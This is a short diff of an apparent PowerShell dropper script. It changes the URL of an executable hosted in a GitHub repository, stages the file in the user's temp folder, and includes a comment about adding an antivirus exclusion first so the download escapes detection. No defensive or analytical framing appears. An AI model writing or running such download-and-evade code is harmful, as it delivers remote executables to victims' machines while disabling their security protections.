@@ -1,4 +1,4 @@
-$url = 'https://github.com/ct7ybve7f387/tests/raw/refs/heads/main/cf2.exe'
+$url = 'https://github.com/ct7ybve7f387/tests/raw/refs/heads/main/Client3.exe'
 $output = "$env:TEMP\cf2.exe"
 
 # Add exclusion first to prevent detection during download (requires admin privileges)
